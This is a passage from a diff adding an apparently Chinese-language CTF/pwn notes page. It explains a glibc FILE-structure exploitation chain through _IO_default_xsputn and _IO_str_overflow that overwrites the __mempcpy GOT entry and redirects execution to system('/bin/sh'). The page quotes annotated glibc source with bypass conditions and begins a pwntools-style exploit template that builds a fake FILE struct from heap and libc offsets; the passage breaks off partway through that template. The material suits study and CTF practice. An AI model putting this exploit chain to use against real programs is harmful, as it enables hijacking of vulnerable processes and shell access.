+</span></span><span class="line"><span class="cl">          <span class="n">used</span> <span class="o">-</span> <span class="n">written</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">s</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-=</span> <span class="n">written</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#else
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="c1">// 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">used</span> <span class="o">=</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">used</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">size_t</span> <span class="n">written</span> <span class="o">=</span> <span class="n">_IO_sputn</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span> <span class="n">used</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">written</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">written</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">memmove</span> <span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">+</span> <span class="n">written</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="n">used</span> <span class="o">-</span> <span class="n">written</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">s</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-=</span> <span class="n">written</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="k">return</span> <span class="n">PUTC</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>修改 <code>((struct helper_file*) s)-&gt;_put_stream</code> 的 <code>vtable</code> 指向 <code>_IO_str_jumps</code> ，使其调用 <code>_IO_default_xsputn</code> 函数</li>
+<li><code>_IO_default_xsputn</code> 函数内要绕过的内容较多，其攻击过程中两次调用 <code>__mempcpy</code> ：
+<ul>
+<li>第一次利用任意地址写修改 <code>__mempcpy</code> 对应的 got 表中的值</li>
+<li>第二次调用 <code>__mempcpy</code> 劫持程序执行流</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">size_t</span> <span class="nf">_IO_default_xsputn</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">size_t</span> <span class="n">more</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">more</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(;;)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* Space available. */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">size_t</span> <span class="n">count</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// 要 more &gt; count，能再次返回执行 __mempcpy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="n">more</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">count</span> <span class="o">=</span> <span class="n">more</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// 要 count &gt; 20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// 利用此处实现 house of 借刀杀人，
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="c1">// 修改 memcpy 的内容为setcontext
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="c1">// 再次返回的时候就能够实现 house of 一骑当千
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">s</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">count</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">ssize_t</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">p</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">s</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// 要 more &gt; count，能再次返回执行 __mempcpy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">more</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 绕过下面这一行，再次执行for循环的内容，_IO_OVERFLOW实际调用_IO_str_overflow
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">more</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="o">*</span><span class="n">s</span><span class="o">++</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">more</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">more</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_default_xsputn</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>绕过</strong></p>
+<ul>
+<li>需要 <code>more</code> &gt; <code>count</code>，能再次返回执行 <code>__mempcpy</code>，且要想再次返回执行 <code>memcpy</code>，由于此时 <code>f-&gt;_IO_write_ptr</code> 被 <code>_IO_str_overflow</code> 函数修改为指向 <code>&quot;/bin/sh&quot;</code> 字符串，因此 <code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code> 可能为一个很大的值，导致 <code>count &gt; more</code>，进而更新 <code>count</code> 为 <code>more</code> ，因此再次循环时要求 <code>more &gt; 20</code> 。由于上一次循环中依次执行了 <code>more -= count</code> 和 <code>more--</code> 语句，因此要求 <code>more</code> ≥ <code>count + 1 + 21</code> 。</li>
+<li>需要 <code>count</code> &gt; 20，因此 <code>count</code> 至少为 21 。</li>
+<li>第一次执行 <code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 时，
+<ul>
+<li><code>_IO_write_ptr</code> 为 <code>__mempcpy</code> 表项，</li>
+<li>s 为要写入的内容。</li>
+</ul>
+</li>
+<li>再次执行<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 时，
+<ul>
+<li>需要绕过 <code>if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</code> ，具体绕过方式接下来会介绍。</li>
+<li><code>f-&gt;_IO_write_ptr</code> 为 <code>rdi</code> ，<code>s</code> 为 <code>rsi</code> ，<code>count</code> 为 <code>rdx</code> 。</li>
+</ul>
+</li>
+</ul>
+<p><code>_IO_str_overflow</code>作用：控制 <code>fp-&gt;_IO_write_ptr</code> ，从而控制 <code>_IO_default_xsputn</code> 第二次循环中 <code>__mempcpy</code> 的第一个参数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">_IO_str_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">flush_only</span> <span class="o">=</span> <span class="n">c</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">size_t</span> <span class="n">pos</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">flush_only</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 需要进入来控制 fp-&gt;_IO_write_ptr ， _flags==0x400
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_TIED_PUT_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span> <span class="c1">// 控制 fp-&gt;_IO_write_ptr 指向 &amp;&#34;/bin/sh&#34; - 1 作为下一次 memcpy(system) 的第一个参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pos</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 不能进入，要让 _IO_blen (fp)  ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 足够大。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">+</span> <span class="n">flush_only</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_USER_BUF</span><span class="p">)</span> <span class="cm">/* not allowed to enlarge */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">char</span> <span class="o">*</span><span class="n">new_buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">char</span> <span class="o">*</span><span class="n">old_buf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">size_t</span> <span class="n">old_blen</span> <span class="o">=</span> <span class="n">_IO_blen</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">size_t</span> <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_blen</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">old_blen</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">new_buf</span> <span class="o">=</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="cm">/*      __ferror(fp) = 1; */</span>
+</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">memcpy</span> <span class="p">(</span><span class="n">new_buf</span><span class="p">,</span> <span class="n">old_buf</span><span class="p">,</span> <span class="n">old_blen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">free</span> <span class="p">(</span><span class="n">old_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="cm">/* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */</span>
+</span></span><span class="line"><span class="cl">          <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">memset</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">+</span> <span class="n">old_blen</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">new_size</span> <span class="o">-</span> <span class="n">old_blen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">      <span class="n">_IO_setb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">new_buf</span><span class="p">,</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="n">new_size</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">old_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">new_buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">flush_only</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 此处 fp-&gt;_IO_write_ptr 自加1，所以之前要少1.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_str_overflow</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>绕过</strong></p>
+<ul>
+<li><code>_flags = 0x400</code> 。</li>
+<li><code>fp-&gt;_IO_read_ptr</code> 为再次执行 <code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 的 <code>rdi - 1</code> 。</li>
+<li><code>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</code> 要足够大，一般设置 <code>(fp)-&gt;_IO_buf_end = 0xFFFFFFFFFFFFFFF0</code> 即可</li>
+</ul>
+<p><strong>利用</strong></p>
+<p><img src="/img/pwn_note.zh-cn.assets/60649d737092dba6af8cb8c9977061aa.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="house-of-cmwl"
+	
+	
+></p>
+<p><strong>模板</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">file_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x6d0</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_addr</span> <span class="o">=</span> <span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">wide_data_addr</span> <span class="o">=</span> <span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0xe0</span>
+</span></span><span class="line"><span class="cl"><span class="n">memcpy_buf_addr</span> <span class="o">=</span> <span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0x1c8</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">memcpy_got_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1d1040</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_read_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_read_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_write_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>  <span class="err">#</span> <span class="n">_IO_write_end</span>
